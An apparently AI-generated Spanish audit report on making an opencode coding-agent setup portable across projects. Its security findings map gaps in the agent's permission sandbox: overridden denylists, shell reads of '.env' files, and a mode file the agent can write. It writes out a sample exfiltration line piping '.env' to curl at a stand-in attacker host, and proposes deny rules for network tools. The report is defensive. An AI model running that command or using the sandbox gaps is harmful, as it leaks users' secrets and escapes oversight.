# Análisis: Globalización del Gentleman Agent para N proyectos externos

**Fecha**: 2026-08-01 · **Trigger**: `!analisis` (re-verificación del plan de portabilidad antes de ejecutar)
**Pre-Answer Gate**: ✅ Cross-referenciado contra `2026-07-28-permission-modes-analysis.md`, `2026-07-30-auto-permission-analysis.md`, `2026-07-30-infra-capabilities-external-audit.md`, `2026-07-31-skill-ecosystem-audit.md`, memoria #2014
**SCOPE GUARD**: diff HEAD~1 = 1 archivo (bitacora doc — no es el target). El scope real (configs global+repo, 90 scripts, 81 skills, MCP) supera el umbral → pipeline multi-agente aplica. Desviación documentada.
**Especialistas**: sec · infra · docs · arch · verificación (frontend/perf/datascience/seo = SKIPPED-N/A)
**Veredicto general**: APROBADO-CON-CONDICIONES (5/5 especialistas)

---

## 1. Summary

El plan de globalización es **viable pero NO como fue planteado** — hay 3 precondiciones no resueltas (GENTLEMAN_AGENT_ROOT vacío, CBM_ALLOWED_ROOT hardcodeado, permisos duplicados por agente) y 2 decisiones de diseño pendientes (shortcuts reales vs interpretados; junctions vs copias). La infraestructura YA tiene maquinaria de globalización parcial (use-gentleman.ps1, cadena de generación de config, mode-gate con fallback external-aware) que el plan debe reutilizar, no duplicar.

## 2. Findings por dimensión (8 dims)

| Dim | Especialista | Hallazgo | Consensus |
|-----|-------------|----------|-----------|
| **Sec** | sec | LAYERING BREAK: la denylist global (node/python/docker/curl) SOLO aplica a agents SIN bloque `permission.bash` propio; los 5 `-auto`/5 `-semi` lo sobrescriben → safety net agujereable. Denylist duplicada ~960 líneas boilerplate por agente. Ya detectado en `2026-07-30-auto-permission-analysis.md` H1. `confidence: high` | UNANIMOUS |
| **Sec** | sec | La denylist de secretos (read/write/edit de `.env`, credentials) NO cubre bash: `Get-Content .env`/`cat` escribe vía shell. Con `curl` abierto → exfiltración `cat .env \| curl -T - attacker`. `confidence: high` | UNANIMOUS |
| **Sec** | sec+verif | Relajar node/npx/python/docker/curl POR PROYECTO = RCE + supply-chain (npx -y) + root total (docker.sock). Verif lo comprobó empíricamente: `node --version` bloqueado por la gate. `confidence: high` | UNANIMOUS |
| **Sec/Arch** | sec+arch | Modos manual/semi/auto = **comportamiento del modelo**, NO gate de seguridad. `.gentleman-mode` es escribible por el agente (sin deny de write); el enforcement real vive en `opencode.json` (deny `opencode.json` write). `switch-mode.ps1:135-137` admite que el cambio runtime exige editar opencode.json a mano. `confidence: high` | UNANIMOUS |
| **Infra** | infra | `GENTLEMAN_AGENT_ROOT` **VACÍO en Process/User/Machine** y NO hay $PROFILE → el one-liner de `AGENTS.md:40` resuelve hoy a `\scripts\bash-safe.ps1` = ROTO EN ESTE MOMENTO. `setup-machine.ps1:58-71` lo arregla (SetEnvironmentVariable User) pero nunca se ejecutó. `confidence: high` | UNANIMOUS |
| **Infra** | infra | Scripts derivan root de `$PSScriptRoot`: `audit-log.ps1:55`, `switch-mode.ps1:39`, `platform.ps1:22-25` → globalizados escribirían en `~/.config/opencode`, no en el proyecto. Auditoría de ~90 scripts necesaria. `confidence: high` | UNANIMOUS |
| **Infra** | infra | `~/.config/opencode/scripts/` es carpeta REAL con `bash-safe.ps1` copia PS5.1 (hash ≠ repo PS7) — la auto-detección por junction (`bash-safe.ps1:236-240`) está MUERTA en la copia global. `confidence: high` | MAJORITY |
| **Infra/Arch** | infra+arch | Junctions de skills: 81/91 apuntan a rutas ABSOLUTAS `D:\gentleman-agent-gh\.agents\skills\`; **3 colgantes** (cognitive-doc-design, prompt-engineering, senior-engineer — muertos confirmados por #2014). Si el repo se mueve/borra → TODAS las skills globales desaparecen. `confidence: high` | MAJORITY (infra: junction OK; arch: frágil cross-machine) |
| **DX** | docs | **Shortcuts NO son comandos reales**: `commands/` global tiene SOLO sdd-* (10) + skill-creator + skill-registry. `!analisis`/`!score`/`!auto`/`!semi`/`!manual` funcionan por triggers de skills + AGENTS.md (frágil). **`!auto`/`!semi`/`!manual` NO tienen handlers** — ya detectado en `2026-07-30-auto-permission-analysis.md` L131/L215. `confidence: high` | UNANIMOUS |
| **DX** | docs | `SKILLS-INDEX.md` **duplicado y dreifado**: SHA256 repo v5.2 ≠ global v5.1 (archivó 3 skills muertas en repo, global aún las lista; "165 skills" vs "93 skills"). `SHORTCUTS.md`/`PROTOCOL.md` NO existen en global; AGENTS.md referencia 5 docs (L7-11) → 3 links ya rotos en global. `confidence: high` | UNANIMOUS |
| **Arch** | arch | `opencode.json` del repo = **copia byte-a-byte del global** (33 agents, default_agent gentleman-vMK, mismos plugins). La fuente de verdad real es la cadena: `scripts/lib/opencode-base.json` + `semi-agents.json` + `expand-config.ps1`. Única diff: mcp.engram (wrapper vs binario desnudo). `confidence: high` | UNANIMOUS |
| **Arch** | arch | CBM_ALLOWED_ROOT hardcodeado a `D:\gentleman-agent-gh` en AMBOS configs (global:209, repo:209) + `opencode-base.json:209`. El config ya usa interpolación `{env:...}` (opencode.json:237) → parametrizable. `confidence: high` | UNANIMOUS |
| **Arch** | arch | Mode-Aware Routing COHERENTE con fallback real: `mode-gate.ps1:147-153` permite agente base si el sufijado no existe; default `manual` (mode-gate.ps1:63) = fallback seguro. Tests lo confirman (`mode-gate.Integration.Tests.ps1:51`). `confidence: high` | UNANIMOUS |
| **Perf** | verif | Verificación actual ESTÁTICA: `verify.ps1:22-137` E1/E2/E3 + 27 Pester + smoke; NADA corre opencode headless ni valida otro proyecto → el paso 5 del plan es el eslabón faltante y es correcto. "Skills cargan" ES verificable: `opencode debug skill` lista 89 skills con location real. `confidence: high` | UNANIMOUS |
| **Biz** | verif | Criterio del plan "node/python corren" **contradice la postura de seguridad** → insatisfacible hoy (bloqueo empírico). "CBM_ALLOWED_ROOT dinámico" es **precondición**, no aserción del paso 5. `confidence: high` | UNANIMOUS |

### 2.1 SHORTCUTS — inventario y veredicto (dimensión DX dedicada)

| Shortcut | Tipo hoy | ¿Portable a N proyectos? |
|----------|----------|--------------------------|
| `!sdd init/propose/spec/design/tasks/apply/verify/continue/ff/new/onboard/status` | ✅ Comando real (commands/ global) | SÍ — global de verdad |
| `!skill-registry`, `!skill-creator` | ✅ Comando real | SÍ |
| `!analisis`, `!ejecutar` | ⚠️ Trigger de skill (analysis-mode/ejecucion) | A MEDIAS — depende de que la skill esté en sesión |
| `!score`, `!health`, `!close`, `!batch`, `!cycle`, `!sync`, `!compress` | ⚠️ Interpretados por AGENTS.md | A MEDIAS — doc solo en repo |
| `!auto`, `!semi`, `!manual`, `!mode` | ❌ **SIN HANDLERS** (script existe, shortcut no) | NO — ver `2026-07-30-auto-permission-analysis.md` L131/L215 |
| `!ship`, `!check`, `!fast`, `!draft`, `!ponytail` | ⚠️ Interpretados | A MEDIAS |
| `!ralph`, `/ralph-loop` | ✅ Plugin global (opencode-ralph-loop) | SÍ |

**Riesgos específicos** (`confidence: high`):
1. `SHORTCUTS.md` vive SOLO en repo → en proyecto externo la tabla no se carga; el modelo sabe los modos por AGENTS.md global pero NO la semántica completa.
2. Anclas rotas: `PROTOCOL.md:48,56` enlazan `SHORTCUTS.md#ponytail-mode` → copiar ambos juntos u overwrite, nunca copy-if-missing.
3. `AGENTS.md` global referencia 5 docs (L7-11: PROTOCOL, SHORTCUTS, SKILLS-INDEX, QUICKSTART, docs/ARCHITECTURE) → copiar los 5 o recortar la nav para la variante global.
4. Sin handlers de modo, `!auto`/`!semi`/`!manual` quedan como script no usable desde chat (H7 pendiente desde 07-30).

## 3. Síntesis — Consensus

| Finding | Consensus | Riesgo | Recomendación |
|---------|-----------|--------|---------------|
| CBM_ALLOWED_ROOT hardcodeado (global:209, repo:209, base:209) | UNANIMOUS | ALTO | Parametrizar `{env:GENTLEMAN_AGENT_ROOT}` o `{projectRoot}` en la cadena de generación |
| GENTLEMAN_AGENT_ROOT vacío + sin $PROFILE | UNANIMOUS | ALTO | Ejecutar `setup-machine.ps1` (User scope) como paso 0 |
| Permisos: LAYERING BREAK + duplicación por agente | UNANIMOUS | CRÍTICO | Single-source: generar config desde `opencode-base.json` + `semi-agents.json`; nunca hand-edit; template de proyecto generado, no copiado |
| Modos = modelo, no gate; `.gentleman-mode` escribible | UNANIMOUS | MEDIO | Documentar como convención; el gate real queda en opencode.json (write-deny) |
| Shortcuts: no reales + sin handlers de modo | UNANIMOUS | MEDIO | Registrar `commands/*.md` reales para `!analisis !ejecutar !score !health !auto !semi !manual` + copiar SHORTCUTS/PROTOCOL/SKILLS-INDEX/QUICKSTART a global con sync |
| Drift: SKILLS-INDEX v5.1/v5.2, scripts PS5.1/PS7, prompts duplicados | MAJORITY | MEDIO | Sync no copy-if-missing; fuente única vía generación |
| Junctions absolutas + 3 colgantes | MAJORITY | MEDIO | Mantener junction (fuente única) + script de resync/documentar reubicación; limpiar 3 colgantes |
| Scripts con `$PSScriptRoot` → se rompen globalizados | UNANIMOUS | ALTO | Auditoría de ~90 scripts: rutas basadas en env var, no en ubicación del script |
| Verificación estática; criterios 2 de 5 insatisfacibles | UNANIMOUS | MEDIO | Redefinir criterios: `opencode debug skill` (carga), fallback de modo esperado (comportamiento), NO node/python; CBM dinámico = precondición |

## 4. Risk Matrix

| # | Riesgo | P | I | Mitigación |
|---|--------|---|---|------------|
| R1 | Exfiltración de secretos vía bash (Get-Content \| curl) | M | CRÍTICO | Mantener curl/Invoke-WebRequest/wget DENY en todo perfil; negar `cat .env`-style a nivel bash |
| R2 | RCE en proyecto externo (node/python/npx/docker habilitados) | M | CRÍTICO | Permitir por proyecto SOLO lo necesario; docker nunca; firmar template de permisos |
| R3 | Supply-chain: scripts/skills globales sobrescribibles (write "*": allow, sin deny a ~/.config/opencode/**) | L | ALTO | Añadir write-deny a `~/.config/opencode/**` en perfiles de proyecto |
| R4 | Skills globales desaparecen si el repo se mueve (junctions absolutas) | M | ALTO | Resync script + documentar; considerar junction relativa |
| R5 | First-session en proyecto externo: mode-gate falla silencioso (sin .gentleman-mode) | M | MEDIO | Bootstrap crea `.gentleman-mode` default manual; fallback ya existe (mode-gate.ps1:147-153) |
| R6 | Drift continuo de docs/scripts duplicados | M | MEDIO | Sync automatizado en la cadena de generación (expand-config) |

## 5. Recomendaciones (plan corregido)

1. **Paso 0 — Fundación**: ejecutar `setup-machine.ps1` (setea GENTLEMAN_AGENT_ROOT User). Auditar ~90 scripts por `$PSScriptRoot` → reemplazar por resolución vía env var con fallback.
2. **Paso 1 — Docs globales (corregido)**: copiar a global SHORTCUTS.md + PROTOCOL.md + SKILLS-INDEX.md + QUICKSTART.md con **sync** (no copy-if-missing — el drift ya demostró el bug); recortar o resolver los 5 links de AGENTS.md.
3. **Paso 1b — Shortcuts reales**: registrar `commands/*.md` para `!analisis`, `!ejecutar`, `!score`, `!health`, `!auto`, `!semi`, `!manual` → elimina la interpretación frágil y resuelve H7 pendiente (07-30). Handlers de modo apuntando al switch-mode global.
4. **Paso 2 — Scripts globales**: mover a `~/.config/opencode/scripts/` (única copia, eliminar duplicado PS5.1), rutas por env var.
5. **Paso 3 — Bootstrap por proyecto (corregido)**: `gentleman-init` genera opencode.json desde la cadena (`opencode-base.json` + `semi-agents.json`), NO copia byte-a-byte. Template con permisos relajados SOLO para runtimes necesarios, **network cerrada (curl/wget/iwr deny)**, denylist de secretos reforzada a nivel bash, write-deny a `~/.config/opencode/**`.
6. **Paso 4 — CBM_ALLOWED_ROOT**: `{env:GENTLEMAN_AGENT_ROOT}` con fallback a cwd.
7. **Paso 5 — Verificación (corregida)**: criterios = (a) `opencode debug skill` lista 89 skills en proyecto externo, (b) routing con fallback: modo default manual → base agent permitido, (c) `.gentleman-mode` creado por bootstrap y leído, (d) shortcuts reales responden, (e) CBM indexa el proyecto externo (solo si paso 4 hecho). NO "node/python corren" — contradice postura de seguridad.
8. **Limpieza**: resolver 3 junctions colgantes (skills muertos #2014).
9. **Shortcuts nuevos desde patrones** (evidencia: git log 300 commits + BITACORA): registrar como comandos reales `!global <dir>` (bootstrap proyecto externo — patrón portabilidad), `!ctx-lite` (campaña reducción de contexto), `!perf` (plan performance tests/scripts), `!skills-audit` (drift skills). Extender `!health` (skills-drift) y `!close` (gate push/0-pendientes). Detalle en §5.2.

### 5.2 Patrones de trabajo → Shortcuts propuestos (evidencia)

| Patrón observado | Evidencia | Shortcut | Estado |
|---|---|---|---|
| Usar el sistema en N proyectos externos | Conversación actual; `!gentleman` (SHORTCUTS.md:69) existe pero es interpretado y frágil | `!global <dir>` — genera opencode.json desde la cadena + `.gentleman-mode` manual + enlace de skills | 🆕 NUEVO (real) |
| Reducción de contexto recurrente | git log: AGENTS.md 27→14.1KB (06-30), 20→14.8KB (07-05), token/context P0-P3 (07-29); `!compress` hoy solo cubre skills | `!ctx-lite` — campaña completa: AGENTS.md+prompts+docs+SKILLS-INDEX dedup + archive stale | 🆕 NUEVO (real) |
| Planes de performance sobre tests/scripts | git log: `perf`=18; BITACORA 07-31 (553s→150s, P0-P3), 07-05 | `!perf` — quick pass perf-profiling sobre scripts/tests | 🆕 NUEVO (real) |
| Auditoría de skills/drift | 07-31 audit #2014; drift SKILLS-INDEX v5.1/v5.2 detectado hoy | `!skills-audit` — SKILLS-INDEX vs skills reales vs junctions | 🆕 NUEVO (real) |
| Disciplina de cierre: push + 0 pendientes | BITACORA 07-04 "6 commits pushed, 0 pendientes" | `!close` + gate push/clean-tree | 🔧 EXTENDER |
| Verify-before-execute | `!analisis` antes de toda acción (07-28/29/30/31 + hoy) | `!analisis` / `!ejecutar` existentes | ✅ MANTENER |

## 6. Engram Persistence

- Observación: `analysis:gentleman-agent-gh:2026-08-01` (mem_save)
- topic_key: `analysis/gentleman-agent-gh`
- Cross-ref previos: #2014 (skill ecosystem, 2026-07-31), #2069 (gap analysis global), #2252/#2254 (tests perf)

## 7. Trend Analysis (vs previos)

**Mejoras vs `2026-07-30-auto-permission-analysis.md`**: su H1 (LAYERING BREAK) y H7 (shortcuts sin handlers) se CONFIRMAN hoy con evidencia adicional (empírica: bloqueo de node; estructural: commands/ global). Su hallazgo de ~960 líneas de duplicación explica por qué el repo opencode.json es byte-idéntico al global.
**Nuevo hoy**: (1) GENTLEMAN_AGENT_ROOT vacío — one-liner de AGENTS.md roto EN ESTE MOMENTO, no solo "en externo"; (2) auto-detección por junction muerta en la copia global de scripts; (3) drift SKILLS-INDEX v5.1/v5.2 materializado; (4) CBM_ALLOWED_ROOT + junctions absolutas como bloqueadores de la globalización; (5) veredicto 5/5 APROBADO-CON-CONDICIONES sobre el plan propuesto.
**Regresión**: ninguna detectada.
**Stale**: `2026-07-24-gentleman-agent-gh-ejecucion.md` L51 "SHORTCUTS date — skipped" sigue sin resolverse (relacionado con H7).

---
*Documento generado como parte del análisis `!analisis` — re-verificación del plan de globalización. Read-only: solo este reporte fue escrito.*
*📌 Ajuste post-análisis (2026-08-01): §5.2 añadida — patrones de trabajo → 4 shortcuts nuevos (`!global`, `!ctx-lite`, `!perf`, `!skills-audit`) + 2 extensiones (`!health`, `!close`). Aprobado por el usuario.*
